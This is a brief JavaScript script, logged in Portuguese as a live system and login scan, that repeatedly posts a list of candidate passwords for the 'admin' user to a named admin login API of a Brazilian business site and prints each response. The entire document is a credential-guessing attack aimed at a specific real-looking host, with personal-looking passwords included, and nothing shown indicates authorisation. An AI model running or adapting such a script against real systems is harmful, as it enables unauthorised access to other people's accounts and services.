async function runScan() {
  console.log("=== VARREDURA EM TEMPO REAL DO SISTEMA E LOGIN ===");

  const targetUrl = "https://admin.valoranegocios.com.br/painel-seguro-liveinfinity/api/admin/login";

  const passwords = [
    "Valora2024SaaS!",
    "Diego14032010",
    "Valora2024!",
    "admin"
  ];

  for (const pass of passwords) {
    try {
      console.log(`\nTesting POST ${targetUrl} (pass: "${pass}")...`);
      const res = await fetch(targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: "admin", password: pass })
      });
      console.log(`HTTP Status: ${res.status}`);
      const body = await res.json().catch(() => "NON_JSON");
      console.log("Response Body:", body);
    } catch (err) {
      console.error("Fetch Error:", err.message);
    }
  }
}

runScan();
